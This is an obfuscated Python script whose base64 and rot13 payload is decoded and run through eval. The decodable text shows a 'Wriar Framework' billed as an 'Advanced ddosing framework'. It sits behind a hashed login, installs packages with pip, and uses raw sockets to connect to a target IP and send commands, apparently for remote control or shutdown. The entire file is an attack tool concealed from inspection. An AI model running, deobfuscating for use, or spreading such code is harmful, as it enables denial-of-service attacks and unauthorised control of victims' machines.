# Python code obfuscated by www.development-tools.net


import base64, codecs

magic = 'IyBMb2cxY2V4ZQ0KZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZSwgU3R5bGUNCmltcG9ydCBzb2NrZXQNCmltcG9ydCByZXF1ZXN0cw0KaW1wb3J0IG9zDQppbXBvcnQgaGFzaGxpYg0KaW1wb3J0IHRpbWUNCg0KY2xhc3MgTWFpbjoNCiAgICBkZWYgX19pbml0X18oc2VsZik6DQogICAgICAgIG9zLnN5c3RlbSgnY2xzICYmIHRpdGxlIFdyaWFyIEZyYW1ld29yaycpDQogICAgICAgIHByaW50KEZvcmUuQ1lBTiArIHInJycNCl9fICAgICAgIF9fICAgICAgICAgICAgX18gICAgICAgICAgICAgICAgICAgICANCnwgIFwgIF8gIHwgIFwgICAgICAgICAgfCAgXCAgICAgICAgICAgICAgICAgICAgDQp8ICQkIC8gXCB8ICQkICBfX19fX18gICBcJCQgIF9fX19fXyAgICBfX19fX18gIA0KfCAkJC8gICRcfCAkJCAvICAgICAgXCB8ICBcIHwgICAgICBcICAvICAgICAgXCANCnwgJCQgICQkJFwgJCR8ICAkJCQkJCRcfCAkJCAgXCQkJCQkJFx8ICAkJCQkJCRcDQp8ICQkICQkXCQkXCQkfCAkJCAgIFwkJHwgJCQgLyAgICAgICQkfCAkJCAgIFwkJA0KfCAkJCQkICBcJCQkJHwgJCQgICAgICB8ICQkfCAgJCQkJCQkJHwgJCQgICAgICANCnwgJCQkICAgIFwkJCR8ICQkICAgICAgfCAkJCBcJCQgICAgJCR8ICQkICAgICAgDQogXCQkICAgICAgXCQkIFwkJCAgICAgICBcJCQgIFwkJCQkJCQkIFwkJCAgICAgIA0KDQogICAgICAgICAgfHwgQWR2YW5jZWQgZGRvc2luZyBmcmFtZXdvcmsgfHwNCg0KKj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSonJycgKyBTdHlsZS5SRVNFVF9BTEwpDQoNCiAgICAgICAgcHJpbnQoRm9yZS5ZRUxMT1cgKyAiWytdIEluc3RhbGxpbmcgdGhlIGRlcGVuZGVuY2llcyIpDQogICAgIC'
love = 'NtVT9mYaA5p3EyoFtvpTyjZlOcoaA0LJkfVTAioT9lLJ1uVPLzVUOcpQZtnJ5mqTSfoPObLKAboTyvVvxAPvNtVPNtVPNto3Zhp3ymqTIgXPqwoUZaXD0XQDbtVPNtVPNtVUOlnJ50XRMipzHhD1yOGvNeVUVaWlpAPy9sVPNtVPNtVS9sVPNtVPNtVPNtVPNtK18tVPNtVPNtVPNtVPNtVPNtVPNtVPNAPajtVSjtVS8tVUjtVSjtVPNtVPNtVPNtsPNtKPNtVPNtVPNtVPNtVPNtVPNtVPNtQDc8VPDxVP8tKPO8VPDxVPOsK19sK18tVPOpWPDtVS9sK19sKlNtVPOsK19sK18tVN0XsPNxWP8tVPEpsPNxWPNiVPNtVPNtKPO8VPOpVUjtVPNtVPOpVPNiVPNtVPNtKPNAPajtWPDtVPDxWSjtWPE8VPNxWPDxWPEpsPNxWPNtKPDxWPDxWSk8VPNxWPDxWPEpQDc8VPDxVPDxKPDxKPDxsPNxWPNtVSjxWUjtWPDtYlNtVPNtVPDxsPNxWPNtVSjxWN0XsPNxWPDxVPOpWPDxWUjtWPDtVPNtVPO8VPDxsPNtWPDxWPDxWUjtWPDtVPNtVPNAPajtWPDxVPNtVSjxWPE8VPDxVPNtVPNtsPNxWPOpWPDtVPNtWPE8VPDxVPNtVPNtQDbtKPDxVPNtVPNtKPDxVSjxWPNtVPNtVPOpWPDtVSjxWPDxWPDxVSjxWPNtVPNtVN0XQDbtVPNtVPNtVPNtVPNtVPNtVPO8sPOOMUMuozAyMPOxMT9mnJ5aVTMlLJ1yq29lnlO8sN0XQDbdCG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09XvpaWlNeVSA0rJkyYyWSH0IHK0SZGPxAPvNtVPNtVPNtp2IfMv5grKImMKWhLJ1ynTSmnPN9VPV3ZTHjZwx0Lmt2L2L1AQDlZmOuBJH5LzR4MQD3ATDjZJR1LGSyZzR0Vt0XVPNtVPNtVPOmMJkzYz15pTSmp3qipzEbLKAbVQ0tVwAwAJAyZJMwATR2LwuzZQt5LzMzMzD2Amt3BJHjZGqvLwx1BQR1ZQHvQDbAPvNtVPNtVPNtp2IfMv51p2IlozSgMFN9VTyhpUI0XRMi'
god = 'cmUuQ1lBTiArICJcblsrXSBFbnRlciB1c2VybmFtZTogIikNCiAgICAgICAgc2VsZi5wYXNzd29yZCA9IGlucHV0KCJbK10gRW50ZXIgcGFzc3dvcmQ6ICIpDQoNCiAgICAgICAgaWYgaGFzaGxpYi5zaGExKGJ5dGVzKHNlbGYudXNlcm5hbWUuZW5jb2RlKCkpKS5oZXhkaWdlc3QoKSA9PSBzZWxmLm15dXNlcm5hbWVoYXNoIGFuZCBoYXNobGliLnNoYTEoYnl0ZXMoc2VsZi5wYXNzd29yZC5lbmNvZGUoKSkpLmhleGRpZ2VzdCgpID09IHNlbGYubXlwYXNzd29yZGhhc2g6DQogICAgICAgICAgICBwcmludChGb3JlLllFTExPVyArICJcblsrXSAtLT4gTE9HR0VEIElOIFNVQ0NTRVNTRlVMTFkiICsgU3R5bGUuUkVTRVRfQUxMKQ0KICAgICAgICAgICAgdGltZS5zbGVlcCgwLjUpDQogICAgICAgICAgICBvcy5zeXN0ZW0oJ2NscycpDQogICAgICAgICAgICBzZWxmLnNlbGVjdF9vcHRpb24oKQ0KDQoNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgIlxuWytdIC0tPiBXUk9ORyBVU0VSTkFNRSBPUiBQQVNTV09SRCIgKyBTdHlsZS5SRVNFVF9BTEwpDQoNCiAgICBkZWYgc2VsZWN0X29wdGlvbihzZWxmKToNCiAgICAgICAgc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkNCg0KDQogICAgICAgIHNlbGYub3B0aW9uID0gaW5wdXQoRm9yZS5DWUFOICsgcicnJw0KX18gICAgICAgX18gICAgICAgICAgICBfXyAgICAgICAgICAgICAgICAgICAgIA0KfCAgXCAgXyAgfCAgXCAgICAgICAgICB8ICBcICAgICAgICAgICAgICAgICAgICANCnwgJCQgLyBcIHwgJCQgIF9fX19fXyAgIFwkJCAgX19fX19fICAgIF9fX19fXyAgDQp8ICQkLyAgJFx8ICQkIC8gICAgICBcIH'
destiny = 'jtVSjtsPNtVPNtVSjtVP8tVPNtVPOpVN0XsPNxWPNtWPDxKPNxWUjtVPDxWPDxWSk8VPDxVPOpWPDxWPDxKUjtVPDxWPDxWSjAPajtWPDtWPEpWPEpWPE8VPDxVPNtKPDxsPNxWPNiVPNtVPNtWPE8VPDxVPNtKPDxQDc8VPDxWPDtVSjxWPDxsPNxWPNtVPNtVUjtWPE8VPNxWPDxWPDxsPNxWPNtVPNtVN0XsPNxWPDtVPNtKPDxWUjtWPDtVPNtVPO8VPDxVSjxWPNtVPNxWUjtWPDtVPNtVPNAPvOpWPDtVPNtVPOpWPDtKPDxVPNtVPNtVSjxWPNtKPDxWPDxWPDtKPDxVPNtVPNtQDbAPvNtVPNtVPNtVPNtVPNtVPNtI3WcLKVtsUjtDJE2LJ5wMJDtH2Abo29fVRuuL2gcozptEaWuoJI3o3WeVUk8VRkCEmSQEIuSIj0XQDbdCG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09Xt0XQDcoZI0tYF0+VSWyoJ90MFOmnUI0MT93ovOwo21jqKEypt0XJmWqVP0gCvOFqJ4tLFO3nJ5xo3qmVTAioJ1uozDAPyfmKFNgYG4tE2IhMKWuqTHtL29hozIwqTyiovOmo2M0q2SlMFOoIl5WYyOqQDbtVPNtVPNtVN0XVPNtVSAyoTIwqPOuovOipUEco246VPpaWlxAPt0XVPNtVPNtVPOcMvOmMJkzYz9jqTyiovN9CFNvZFV6QDbtVPNtVPNtVPNtVPOmMJkzYaEupzqyqS9cpPN9VTyhpUI0XPWpoyfeKFOSoaEypvO0LKWaMKDtFIN6VPVcQDbAPvNtVPNtVPNtVPNtVUAiL2fhL29hozIwqPtbp2IfMv50LKWaMKEsnKNfBQDlAPxcQDbAPvNtVPNtVPNtVPNtVUAiL2fhp2IhMPuvrKEypltvp2u1qTEiq24tY3ZvYzIhL29xMFtcXFxAPt0XVPNtVPNtVPNtVPNtpUWcoaDbEz9lMF5MEHkZG1ptXlOzVyfeKFNgYG4tH0uIISEWGxptER9KGvO7p2IfMv50LKWaMKEsnKO9VvxAPt0XnJLtK19hLJ1yK18tCG0tW19soJScoy9sWmbAPvNtVPOALJyhXPx='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval(
    '\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval(
    '\x67\x6f\x64') + eval(
    '\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')), '<string>', 'exec'))